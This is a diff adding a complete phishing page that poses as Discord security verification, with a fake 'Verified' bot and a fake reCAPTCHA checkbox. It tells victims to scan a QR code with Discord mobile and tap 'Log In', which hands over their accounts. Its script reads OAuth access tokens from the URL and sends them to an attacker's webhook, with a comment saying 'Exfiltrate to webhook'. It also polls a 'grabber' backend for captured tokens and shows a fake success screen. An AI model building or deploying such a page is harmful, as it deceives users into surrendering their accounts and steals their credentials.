@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verify Your Identity — Discord Security</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+    
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: #1e1f22;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .card {
+      background: #2b2d31;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 480px;
+      overflow: hidden;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+      border: 1px solid #3f4147;
+    }
+
+    /* Header */
+    .header {
+      background: #1e1f22;
+      padding: 24px 28px 20px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      border-bottom: 1px solid #3f4147;
+    }
+    .header .bot-icon {
+      width: 48px;
+      height: 48px;
+      background: linear-gradient(135deg, #5865f2, #4752c4);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      color: white;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+    .header .bot-info h2 {
+      color: #dbdee1;
+      font-size: 17px;
+      font-weight: 600;
+      margin-bottom: 2px;
+    }
+    .header .bot-info .tag {
+      color: #b5bac1;
+      font-size: 13px;
+    }
+    .header .bot-info .tag span {
+      color: #57f287;
+      font-weight: 600;
+    }
+    .badge {
+      background: #248046;
+      color: white;
+      font-size: 10px;
+      font-weight: 700;
+      padding: 2px 8px;
+      border-radius: 10px;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+      margin-left: 6px;
+    }
+
+    /* Body */
+    .body {
+      padding: 24px 28px 28px;
+    }
+
+    .title-section {
+      margin-bottom: 20px;
+    }
+    .title-section h1 {
+      color: #f2f3f5;
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+    .title-section p {
+      color: #b5bac1;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+    .title-section p strong {
+      color: #dbdee1;
+    }
+
+    .steps {
+      background: #1e1f22;
+      border-radius: 8px;
+      padding: 16px 18px;
+      margin-bottom: 20px;
+      border: 1px solid #3f4147;
+    }
+    .step-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 14px;
+    }
+    .step-item:last-child { margin-bottom: 0; }
+    .step-icon {
+      width: 24px;
+      height: 24px;
+      background: #3f4147;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      color: #b5bac1;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+    .step-icon.active {
+      background: #5865f2;
+      color: white;
+    }
+    .step-icon.check {
+      background: #248046;
+      color: white;
+    }
+    .step-text {
+      color: #b5bac1;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+    .step-text strong {
+      color: #dbdee1;
+    }
+
+    /* QR Code Area */
+    .qr-section {
+      background: #1e1f22;
+      border-radius: 8px;
+      padding: 24px;
+      text-align: center;
+      border: 1px solid #3f4147;
+      margin-bottom: 16px;
+    }
+    .qr-label {
+      color: #b5bac1;
+      font-size: 13px;
+      margin-bottom: 16px;
+    }
+    .qr-label strong {
+      color: #dbdee1;
+    }
+    .qr-image-container {
+      width: 200px;
+      height: 200px;
+      margin: 0 auto 12px;
+      background: white;
+      border-radius: 8px;
+      padding: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px dashed #3f4147;
+      position: relative;
+    }
+    .qr-image-container img,
+    .qr-image-container canvas {
+      max-width: 100%;
+      max-height: 100%;
+    }
+    .qr-image-container .placeholder-text {
+      color: #949ba4;
+      font-size: 13px;
+      text-align: center;
+    }
+    .timer {
+      color: #f0b232;
+      font-size: 13px;
+      font-weight: 600;
+      margin-top: 8px;
+    }
+    .timer.expired {
+      color: #ed4245;
+    }
+
+    /* Human verification checkbox */
+    .captcha-area {
+      background: #1e1f22;
+      border-radius: 8px;
+      padding: 14px 18px;
+      border: 1px solid #3f4147;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      cursor: pointer;
+      transition: border-color 0.2s;
+      user-select: none;
+    }
+    .captcha-area:hover {
+      border-color: #5865f2;
+    }
+    .captcha-checkbox {
+      width: 22px;
+      height: 22px;
+      border: 2px solid #b5bac1;
+      border-radius: 4px;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.2s;
+      font-size: 14px;
+      color: transparent;
+    }
+    .captcha-checkbox.checked {
+      background: #5865f2;
+      border-color: #5865f2;
+      color: white;
+    }
+    .captcha-text {
+      color: #b5bac1;
+      font-size: 14px;
+      flex: 1;
+    }
+    .captcha-logo {
+      color: #949ba4;
+      font-size: 11px;
+      font-weight: 500;
+      letter-spacing: 0.3px;
+    }
+
+    /* Footer */
+    .footer {
+      background: #1e1f22;
+      padding: 12px 28px 14px;
+      border-top: 1px solid #3f4147;
+      display: flex;
+      justify-content: flex-end;
+      gap: 12px;
+    }
+    .btn {
+      padding: 10px 24px;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 500;
+      border: none;
+      cursor: pointer;
+      transition: all 0.15s;
+      font-family: inherit;
+    }
+    .btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+    .btn-primary {
+      background: #5865f2;
+      color: white;
+    }
+    .btn-primary:hover:not(:disabled) {
+      background: #4752c4;
+    }
+    .btn-secondary {
+      background: #3f4147;
+      color: #dbdee1;
+    }
+    .btn-secondary:hover:not(:disabled) {
+      background: #515358;
+    }
+
+    /* Status messages */
+    .status {
+      text-align: center;
+      padding: 40px 28px;
+      display: none;
+    }
+    .status .status-icon {
+      font-size: 48px;
+      margin-bottom: 16px;
+    }
+    .status h2 {
+      color: #f2f3f5;
+      font-size: 20px;
+      margin-bottom: 8px;
+    }
+    .status p {
+      color: #b5bac1;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+    .status .error-detail {
+      color: #ed4245;
+      font-size: 13px;
+      margin-top: 10px;
+      padding: 8px 12px;
+      background: rgba(237, 66, 69, 0.1);
+      border-radius: 6px;
+      display: none;
+    }
+
+    /* Loading spinner */
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 3px solid #3f4147;
+      border-top: 3px solid #5865f2;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 0 auto 16px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Mobile responsive */
+    @media (max-width: 500px) {
+      .card { border-radius: 0; }
+      .body { padding: 20px 16px; }
+      .header { padding: 16px; }
+      .footer { padding: 10px 16px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="card" id="mainCard">
+    <!-- Header -->
+    <div class="header">
+      <div class="bot-icon">⬡</div>
+      <div class="bot-info">
+        <h2>
+          CaptchaBot
+          <span class="badge">Verified</span>
+        </h2>
+        <div class="tag">
+          <span>●</span> Online — Security Verification
+        </div>
+      </div>
+    </div>
+
+    <!-- Main body -->
+    <div class="body" id="mainBody">
+      <div class="title-section">
+        <h1>🔐 Human Verification Required</h1>
+        <p>
+          Server <strong>"Community Hub"</strong> requires you to verify you're human 
+          before granting access. This takes <strong>30 seconds</strong>.
+        </p>
+      </div>
+
+      <div class="steps">
+        <div class="step-item">
+          <div class="step-icon active">1</div>
+          <div class="step-text">
+            <strong>Open Discord mobile</strong> — make sure you're logged into your account
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-icon active">2</div>
+          <div class="step-text">
+            Go to <strong>User Settings</strong> → <strong>Scan QR Code</strong>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-icon active">3</div>
+          <div class="step-text">
+            Scan the QR code below and tap <strong>"Log In"</strong> to verify your identity
+          </div>
+        </div>
+      </div>
+
+      <!-- QR Code -->
+      <div class="qr-section">
+        <div class="qr-label">
+          Your unique verification code — <strong>do not share this</strong>
+        </div>
+        <div class="qr-image-container" id="qrContainer">
+          <div class="placeholder-text" id="qrPlaceholder">
+            <div class="spinner"></div>
+            <p style="margin-top:12px;">Generating secure QR code...</p>
+          </div>
+          <img id="qrImage" style="display:none;" alt="Verification QR Code"/>
+        </div>
+        <div class="timer" id="timerDisplay">⏱ Code expires in 2:00</div>
+      </div>
+
+      <!-- Fake Captcha checkbox -->
+      <div class="captcha-area" id="captchaArea">
+        <div class="captcha-checkbox" id="captchaCheckbox">✓</div>
+        <div class="captcha-text">I'm not a robot</div>
+        <div class="captcha-logo">reCAPTCHA</div>
+      </div>
+
+      <p style="color:#72767d;font-size:12px;text-align:center;line-height:1.4;">
+        By verifying, you agree to the server verification terms. 
+        Your account will not be modified.
+      </p>
+    </div>
+
+    <!-- Success / Error states -->
+    <div class="body status" id="successStatus">
+      <div class="status-icon">✅</div>
+      <h2>Verification Complete!</h2>
+      <p>You've been verified. You can close this tab and return to Discord.</p>
+    </div>
+    <div class="body status" id="errorStatus">
+      <div class="status-icon">❌</div>
+      <h2>Verification Failed</h2>
+      <p>The QR code expired or an error occurred. Please request a new verification code.</p>
+      <div class="error-detail" id="errorDetail"></div>
+    </div>
+    <div class="body status" id="loadingStatus">
+      <div class="spinner"></div>
+      <h2>Verifying...</h2>
+      <p>Please wait while we confirm your identity.</p>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer" id="footer">
+      <button class="btn btn-secondary" id="cancelBtn">Cancel</button>
+      <button class="btn btn-primary" id="verifyBtn" disabled>Complete Verification</button>
+    </div>
+  </div>
+
+  <script>
+    // ─── Configuration ──────────────────────────────────────────
+    const CONFIG = {
+      // If you deploy the Cloudflare Worker, set this to the worker URL
+      // which generates QR codes on demand. Otherwise, you'll need to
+      // manually paste QR images via query param or hardcode.
+      API_ENDPOINT: null, // e.g. 'https://your-worker.workers.dev/generate-qr'
+      
+      // Time before QR expires (seconds)
+      QR_TIMEOUT: 120,
+      
+      // Webhook for fallback / direct reporting
+      WEBHOOK_URL: 'YOUR_DISCORD_WEBHOOK_URL',
+    };
+
+    // ─── State ──────────────────────────────────────────────────
+    let qrScanned = false;
+    let tokenCaptured = false;
+    let expiresAt = Date.now() + CONFIG.QR_TIMEOUT * 1000;
+    let timerInterval = null;
+    let pollInterval = null;
+
+    // ─── DOM Elements ───────────────────────────────────────────
+    const qrImage = document.getElementById('qrImage');
+    const qrPlaceholder = document.getElementById('qrPlaceholder');
+    const timerDisplay = document.getElementById('timerDisplay');
+    const captchaArea = document.getElementById('captchaArea');
+    const captchaCheckbox = document.getElementById('captchaCheckbox');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const cancelBtn = document.getElementById('cancelBtn');
+    const mainBody = document.getElementById('mainBody');
+    const successStatus = document.getElementById('successStatus');
+    const errorStatus = document.getElementById('errorStatus');
+    const loadingStatus = document.getElementById('loadingStatus');
+    const errorDetail = document.getElementById('errorDetail');
+    const footer = document.getElementById('footer');
+
+    // ─── QR Code Loading ────────────────────────────────────────
+    function loadQRCode() {
+      // Check if QR was passed via URL parameter (from the grabber)
+      const urlParams = new URLSearchParams(window.location.search);
+      const qrData = urlParams.get('qr');
+      
+      if (qrData) {
+        // QR code data passed as base64 data URL
+        qrImage.src = decodeURIComponent(qrData);
+        qrImage.onload = () => {
+          qrPlaceholder.style.display = 'none';
+          qrImage.style.display = 'block';
+          startTimer();
+        };
+        return;
+      }
+
+      // Try fetching from API endpoint
+      if (CONFIG.API_ENDPOINT) {
+        fetch(CONFIG.API_ENDPOINT)
+          .then(res => res.json())
+          .then(data => {
+            if (data.qr) {
+              qrImage.src = data.qr;
+              qrImage.onload = () => {
+                qrPlaceholder.style.display = 'none';
+                qrImage.style.display = 'block';
+                startTimer();
+              };
+            }
+          })
+          .catch(err => {
+            console.error('Failed to load QR:', err);
+            qrPlaceholder.innerHTML = '<p style="color:#ed4245;">❌ Failed to load QR code</p>';
+          });
+        return;
+      }
+
+      // No QR source — show instructions
+      qrPlaceholder.innerHTML = `
+        <div style="text-align:center;">
+          <p style="color:#b5bac1;font-size:14px;margin-bottom:8px;">
+            📱 QR code will appear here
+          </p>
+          <p style="color:#72767d;font-size:12px;">
+            Ask the server admin to generate a fresh QR code,<br>
+            or paste one into the URL: <code style="color:#5865f2;">?qr=DATA_URL</code>
+          </p>
+        </div>
+      `;
+    }
+
+    // ─── Timer ──────────────────────────────────────────────────
+    function startTimer() {
+      timerInterval = setInterval(() => {
+        const remaining = Math.max(0, Math.floor((expiresAt - Date.now()) / 1000));
+        const mins = Math.floor(remaining / 60);
+        const secs = remaining % 60;
+        timerDisplay.textContent = `⏱ Code expires in ${mins}:${String(secs).padStart(2, '0')}`;
+        
+        if (remaining <= 0) {
+          clearInterval(timerInterval);
+          timerDisplay.classList.add('expired');
+          timerDisplay.textContent = '⏱ Code expired — request a new one';
+          showError('QR code expired. Please generate a new one.');
+        }
+      }, 1000);
+    }
+
+    // ─── Captcha Click ──────────────────────────────────────────
+    captchaArea.addEventListener('click', () => {
+      if (captchaCheckbox.classList.contains('checked')) {
+        captchaCheckbox.classList.remove('checked');
+        verifyBtn.disabled = true;
+      } else {
+        captchaCheckbox.classList.add('checked');
+        verifyBtn.disabled = false;
+        // Simulate a verification "processing" feel
+        setTimeout(() => {
+          // This is just for show — the real verification happens on scan
+        }, 500);
+      }
+    });
+
+    // ─── Verify Button ──────────────────────────────────────────
+    verifyBtn.addEventListener('click', () => {
+      if (!captchaCheckbox.classList.contains('checked')) return;
+      
+      showLoading();
+      
+      // If we detected a scan, proceed to success
+      if (qrScanned || tokenCaptured) {
+        setTimeout(showSuccess, 1500);
+        return;
+      }
+
+      // Simulate checking — in reality the QR scan is the trigger
+      setTimeout(() => {
+        if (qrScanned || tokenCaptured) {
+          showSuccess();
+        } else {
+          showError('Please scan the QR code with Discord mobile first.');
+        }
+      }, 2000);
+    });
+
+    // ─── Cancel Button ──────────────────────────────────────────
+    cancelBtn.addEventListener('click', () => {
+      if (confirm('Are you sure? You will not be able to access the server without verification.')) {
+        window.close();
+      }
+    });
+
+    // ─── UI State Functions ─────────────────────────────────────
+    function showSuccess() {
+      mainBody.style.display = 'none';
+      successStatus.style.display = 'block';
+      errorStatus.style.display = 'none';
+      loadingStatus.style.display = 'none';
+      footer.style.display = 'none';
+      clearInterval(timerInterval);
+      clearInterval(pollInterval);
+    }
+
+    function showError(message) {
+      mainBody.style.display = 'none';
+      successStatus.style.display = 'none';
+      errorStatus.style.display = 'block';
+      loadingStatus.style.display = 'none';
+      footer.style.display = 'flex';
+      if (message) {
+        errorDetail.textContent = message;
+        errorDetail.style.display = 'block';
+      }
+    }
+
+    function showLoading() {
+      mainBody.style.display = 'none';
+      successStatus.style.display = 'none';
+      errorStatus.style.display = 'none';
+      loadingStatus.style.display = 'block';
+      footer.style.display = 'none';
+    }
+
+    // ─── Token Capture Listener ─────────────────────────────────
+    // This listens for the OAuth callback (if using implicit grant)
+    function checkForToken() {
+      const hash = window.location.hash.substring(1);
+      if (!hash) return;
+      
+      const params = new URLSearchParams(hash);
+      const accessToken = params.get('access_token');
+      
+      if (accessToken) {
+        tokenCaptured = true;
+        qrScanned = true;
+        
+        // Exfiltrate to webhook
+        fetch(CONFIG.WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: '@everyone **Token captured via verification page!**',
+            embeds: [{
+              title: 'OAuth Token Captured',
+              fields: [
+                { name: 'Token', value: `\`${accessToken}\``, inline: false },
+                { name: 'Expires', value: `${Math.floor(parseInt(params.get('expires_in') || '0') / 86400)} days`, inline: true },
+                { name: 'Scope', value: params.get('scope') || 'N/A', inline: true },
+              ],
+              color: 0x5865F2,
+              timestamp: new Date().toISOString(),
+            }]
+          })
+        }).catch(() => {});
+
+        // Auto-verify
+        showLoading();
+        setTimeout(showSuccess, 2000);
+      }
+    }
+
+    // ─── Poll for QR scan status (if using backend) ─────────────
+    function startPolling() {
+      if (!CONFIG.API_ENDPOINT) return;
+      
+      const sessionId = new URLSearchParams(window.location.search).get('session');
+      if (!sessionId) return;
+
+      pollInterval = setInterval(async () => {
+        try {
+          const res = await fetch(`${CONFIG.API_ENDPOINT}/status?session=${sessionId}`);
+          const data = await res.json();
+          
+          if (data.token) {
+            qrScanned = true;
+            tokenCaptured = true;
+            clearInterval(pollInterval);
+            
+            // Auto-verify the user
+            if (document.getElementById('mainBody').style.display !== 'none') {
+              showLoading();
+              setTimeout(showSuccess, 1500);
+            }
+          }
+        } catch (e) {
+          console.error('Poll error:', e);
+        }
+      }, 1000);
+    }
+
+    // ─── Init ───────────────────────────────────────────────────
+    document.addEventListener('DOMContentLoaded', () => {
+      loadQRCode();
+      checkForToken();
+      startPolling();
+      
+      // Allow the grabber backend to push token via postMessage
+      window.addEventListener('message', (event) => {
+        if (event.data && event.data.type === 'TOKEN_CAPTURED') {
+          qrScanned = true;
+          tokenCaptured = true;
+          showLoading();
+          setTimeout(showSuccess, 1500);
+        }
+      });
+    });
+  </script>
+</body>
+</html>
